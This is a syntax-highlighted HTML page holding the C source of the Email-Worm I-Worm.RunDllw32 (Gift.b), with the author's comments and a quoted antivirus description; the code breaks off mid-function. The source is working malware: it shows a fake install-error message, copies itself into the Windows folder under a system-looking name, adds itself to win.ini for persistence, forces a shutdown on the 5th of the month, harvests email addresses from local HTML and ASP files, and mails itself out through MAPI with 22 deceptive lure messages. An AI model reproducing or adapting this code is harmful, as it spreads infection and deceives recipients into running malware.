<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Gift - Rundllw32.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*

    I-Worm.RunDllw32
    ~~~~~~~~~~~~~~~~

    Coded by Bumblebee/29


    Disclaimer

     .This is the source code of a I-WORM. The author is not responsabile
    of the damages that may occur due to the compilation and linkage of
      this file. Use it at your own risk.


    Words of the author

     .Yeah, yeah, i know: another worm. After doing Anaphylaxis and Gift i
    began to think i has sufficient experience to code a really powerfull
    worm and this is the result (nah, this is only an improvement of Gift).
    I promisse i will not do another worm until some time ;)

     .22 different messages with different subject, text and attachment. It
    does residence too. Can be annoying but not possible it fucks mail servers
    by excess of mail flow. It uses only shared sessions of MAPI, so if there
    is not a session working the worm does nothing. The run-time part was
    removed due to this it only works when is resident, so the user will be safe
    until next time he/she boots the system. Then the worm will start looking
    for mail addresses to send. The worm still searches into *.ht* file to
    find the 'mailto:', but this time *.asp files are touched too. This is
    a 'slow-worm'.

     .The best feature of the worm is the residence and the slow way to scan
      the system for addresses. With a little amount of luck the user will not
    notice anything before long time. 'Rundllw32' is a nice name to see when
    user press CTL+ALT+SUP. Who can say this is not part of windoze? OK. The
    'w'... hehehe. As most of the worms is easy to remove: the win.ini line
    and delete the worm.

     .This worm has payload thanks to its residence: a lame message box and
    close window call ;)

AVP description of Gift.a and Gift.b (Rundllw32) -----------------------------
 
I-Worm.Gift

This is a worm virus spreading via the Internet. The worm itself is a Windows 
EXE file about 30Kb of length. It is transferred via the net in email messages
with an infected EXE file attachment with different names (see below). When
such a message is received and the attached EXE file is executed, the worm gets
control and starts its spreading routine. This routine scans the current directory,
then the \Windows directory on the current disk, and then the Explorer personal
folder ("My Documents" as default) for .HT* files (HTML and HTTP files), scans 
them and searches for email addresses in files' body. When such addresses are 
located, the worm connects to the network by using MAPI functions and sends its
copy to these email addresses. The worm sends its copy on each start. 
The "Gift.a" worm does not install itself into the system and is executed only 
once - when user activates the file attached to the infected message. So this 
worm is the "nonresident, direct action" Internet Worm. 

The "Gift.b" worm copies itself to the Windows directory with the "Rundllw32.exe"
name and registers it in the system to force Windows to run this file on each startup. 
While registering either WIN.INI file if modified with "Run=" instruction in the 
[Windows] section (under Win9x), or corresponding "Run=" key is modified in WinNT registry. 

To hide its activity the worm displays the fake error message at the end of its work: 

"Gift.a": 

    WinZip Self-eXtractor
     File data corrupt:
     bad disk access or bad data transmission.

"Gift.b": 
    Install error
     File data corrupt:
     probably due to bad data transmission or bad disk access.'

While generating infected emails, the worm fills the fields and names the attached EXE
file with ten ("Gift.a") or twenty-two ("Gift.b") possible variants: 

 Subject          EXE name      Message body
 -------          --------      ------------

 "Gift.a":

 Documents        Docs.exe      Send me your comments...
 Roms             Roms.exe      Test this ROM! IT ROCKS!.
 Pr0n!            Sex.exe       Adult content!!! Use with parental advisory.
 Evaluation copy  Setup.exe     Test it 30 days for free.
 Help             Source.exe    I'm going crazy... please try to find the bug!
 Beta             _SetupB.exe   Send reply if you want to be official beta tester.
 Do not release   Pack.exe      This is the pack ;)
 Last Update      LUPdate.exe   This is the last cumulative update.
 The patch        Patch.exe     I think all will work fine.
 Cracks!          CrkList.exe   Check our list and mail your requests!

 "Gift.b":

 Improve your site           js.exe
 Quiz                        Setup.exe
 IE5 security patch          Ie5Patch.exe
 Shield PAK Installation     ISPAK.EXE
 Secure Communications Inc.  SCommSetup.exe
 Cracks                      clist.exe
 Sex Farm - Adult contents   sfarm.exe
 JsvaScript 4 Docs           jsdoc4.exe
 VB examples                 instEx.exe
 My Rom list                 myList.exe
 IE Plug-in                  ie-pin.exe
 NS Plug-in                  ns-pin.exe
 Honey ;)                    SETUP.EXE
 Damn crack...               crack.exe
 Disk tool                   drDisk.exe
 Sexy game                   powerDick.exe
 freeIRC beta mail list      setupb.exe
 your dlls                   dlls.exe
 cool mail                   smail.exe
 why?                        doc.exe
 y2k fix                     y2k.exe
 benchmark                   bdbench.exe

"Gift.b" message bodies are: 
 Hi! Your page is nice. Test this js scripts and tell me what do you think.
 Hello, Take a look to this little app!
 This is the security patch you asked for... i don't know if is the last version but works.
 Take a look at this new archiver! 30 trial version.
 Do you feel secure? Run this small program to see if your communications are safe.
 Take a look at my cracks list. Ask if you want something ;)
 Sex Farm! Take a look at this little demo for free. Adult content!!!
 This is the information you mean? Let me know if you need something else :)
 1st notice... moreover there are some examples. VB4 runtime is needed!
 I love you :* Thanks you for the information. There is my list...
 There is the plug-in for IE... ;) send me comments.
 There is the plug-in for NS... ;) send me comments.
 Hi honey! How goes? fine here. There is the little app i told you.
 Hello, I'm trying to make run this shit but... please test it if ya can.
 Dunno. But try this. May be it works in your system.
See you!
 Cool pics you send me!!! try this little game... rulez!
 Last Beta 0.6. Reply with subject "un-subscribe" to leave mail list...
 Here goes the dlls you asked for. It's strange you don't have it yet :?
 I'm testing my new cool mail client... rockz! and is smallllll ;)
 What can i do? please reply as soon as posible.
 This will fix your problem ;) You're welcome...
 A backdoor?? nah. But if this makes you feel better, there's a benchmark.


The "Gift.a" worm also modifies the message header fields (sender's address), 
and there can be the fake address "GiftOfFury@Bumblebee.net" found. 
The "Gift.b" worm on 5th of any month displays the message: 

 I-Worm.RunDllw32 Activated
  This is a I-Worm coded by Bumblebee\29a!
  Gretingz to all 29a members ;)
 
------------------------------------------------------------------------------

Good work AVP people! (but this time was easy ;)


                                    The way of the bee
                                                                    The way of the bee
*/</span><span class="sc0">

</span><span class="sc9">#include&lt;windows.h&gt;
#include&lt;mapi.h&gt;
#include&lt;memory.h&gt;
</span><span class="sc0">
</span><span class="sc9">#pragma argsused
</span><span class="sc0">
</span><span class="sc1">/* PROTO */</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MSendMail</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapiMessage</span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sfrom</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sto</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">smes</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">waitMin</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc9">#define NCUSTOM 21
</span><span class="sc1">/* GLOBAL DATA */</span><span class="sc0">
</span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc11">mes</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">mtime</span><span class="sc10">,</span><span class="sc11">sent</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fileNames</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc6">"js.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Setup.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Ie5Patch.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"ISPAK.EXE"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"SCommSetup.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"clist.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"sfarm.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"jsdoc4.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"instEx.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"myList.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"ie-pin.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"ns-pin.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"SETUP.EXE"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"crack.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"drDisk.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"powerDick.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"setupb.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"dlls.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"smail.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"doc.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"y2k.exe"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"bdbench.exe"</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subs</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc6">"Improve your site"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Quiz"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"IE5 security patch"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Shield PAK Installation"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Secure Communications Inc."</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Cracks"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Sex Farm - Adult contents"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"JsvaScript 4 Docs"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"VB examples"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"My Rom list"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"IE Plug-in"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"NS Plug-in"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Honey ;)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Damn crack..."</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Disk tool"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Sexy game"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"freeIRC beta mail list"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"your dlls"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"cool mail"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"why?"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"y2k fix"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"benchmark"</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">texts</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc6">"\n Hi!\n\n\tYour page is nice. Test this js scripts and tell me what do you think.\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Hello,\n\n\tTake a look to this little app!"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n This is the security patch you asked for... i don't know if is the last version but works.\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Take a look at this new archiver! 30 trial version.\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Do you feel secure? Run this small program to see if your communications are safe.\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Take a look at my cracks list. Ask if you want something ;)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Sex Farm! Take a look at this little demo for free. Adult content!!!\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n This is the information you mean? Let me know if you need something else :)\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n 1st notice... moreover there are some examples. VB4 runtime is needed!\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n I love you :* Thanks you for the information. There is my list...\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n There is the plug-in for IE... ;) send me comments.\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n There is the plug-in for NS... ;) send me comments.\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Hi honey!\n\n How goes? fine here. There is the little app i told you.\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Hello,\n\n\t I'm trying to make run this shit but... please test it if ya can.\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Dunno. But try this. May be it works in your system.\nSee you!\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Cool pics you send me!!! try this little game... rulez!\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Last Beta 0.6.\n\n Reply with subject \"un-subscribe\" to leave mail list...\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n Here goes the dlls you asked for. It's strange you don't have it yet :?\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n I'm testing my new cool mail client... rockz! and is smallllll ;)\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n What can i do? please reply as soon as posible.\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n This will fix your problem ;)\nYou're welcome...\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\n A backdoor?? nah. But if this makes you feel better, there's a benchmark.\n"</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc1">/* this time i did residence */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">resident</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">PASCAL</span><span class="sc0">
</span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0">
                                                            </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpCmdLine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nCmdShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">MAPIlHnd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">buffs</span><span class="sc10">=</span><span class="sc4">128</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">keyHnd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">keyPath</span><span class="sc10">[]=</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">keyItem</span><span class="sc10">[]=</span><span class="sc6">"Personal"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">syst</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fh</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">fdata</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* test for payload */</span><span class="sc0">
    </span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">syst</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">syst</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc10">==</span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* hello message box */</span><span class="sc0">
    </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"This is a I-Worm coded by Bumblebee\\29a!\n\nGretingz to all 29a members ;)"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"I-Worm.RunDllw32 Activated"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">|</span><span class="sc11">MB_ICONSTOP</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc1">/* and close windows ;) */</span><span class="sc0">
        </span><span class="sc11">ExitWindowsEx</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">|</span><span class="sc4">4</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">|</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* random number */</span><span class="sc0">
    </span><span class="sc11">count</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc10">)(</span><span class="sc11">syst</span><span class="sc10">.</span><span class="sc11">wMilliseconds</span><span class="sc10">*</span><span class="sc11">syst</span><span class="sc10">.</span><span class="sc11">wMinute</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">count</span><span class="sc10">&gt;</span><span class="sc11">NCUSTOM</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">count</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc10">)(</span><span class="sc11">count</span><span class="sc10">/</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* get module name for the attachment */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc4">512</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc4">128</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"%s\\RUNDLLW32.EXE"</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">strcmpi</span><span class="sc10">(</span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">resident</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* some stealth if not resident */</span><span class="sc0">
    </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"File data corrupt:\n\n   probably due to bad data transmission or bad disk access."</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"Install error"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">|</span><span class="sc11">MB_ICONSTOP</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* go resident if not yet and end */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">resident</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc4">128</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"%s\\Rundllw32.exe"</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">WriteProfileString</span><span class="sc10">(</span><span class="sc6">"WINDOWS"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RUN"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">WriteProfileString</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* test if MAPI32 is avaliable */</span><span class="sc0">
    </span><span class="sc11">MAPIlHnd</span><span class="sc10">=</span><span class="sc11">LoadLibraryA</span><span class="sc10">(</span><span class="sc6">"MAPI32.DLL"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MAPIlHnd</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* get MAPISendMail */</span><span class="sc0">
    </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MSendMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MSendMail</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* if we are here means we are resident */</span><span class="sc0">
    </span><span class="sc1">/* wait 5 minutes */</span><span class="sc0">
    </span><span class="sc11">waitMin</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* scan personal folder */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">((</span><span class="sc11">PHKEY</span><span class="sc10">)</span><span class="sc4">0x80000001</span><span class="sc10">,</span><span class="sc11">keyPath</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_READ</span><span class="sc10">,&amp;</span><span class="sc11">keyHnd</span><span class="sc10">)==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">==</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">keyHnd</span><span class="sc10">,</span><span class="sc11">keyItem</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,&amp;</span><span class="sc11">buffs</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc11">buffs</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc7">'\\'</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc11">buffs</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">findMail</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">"*.ht*"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">findMail</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">"*.asp"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* scan work directory*/</span><span class="sc0">
    </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">,</span><span class="sc6">"*.ht*"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">,</span><span class="sc6">"*.asp"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* scan all the sub-folders of the root dir */</span><span class="sc0">
    </span><span class="sc11">fh</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"\\*.*"</span><span class="sc10">,&amp;</span><span class="sc11">fdata</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* it's a directory? */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fdata</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">)==</span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc1">/* wait (mails sent) minutes */</span><span class="sc0">
            </span><span class="sc11">waitMin</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">sent</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">sent</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
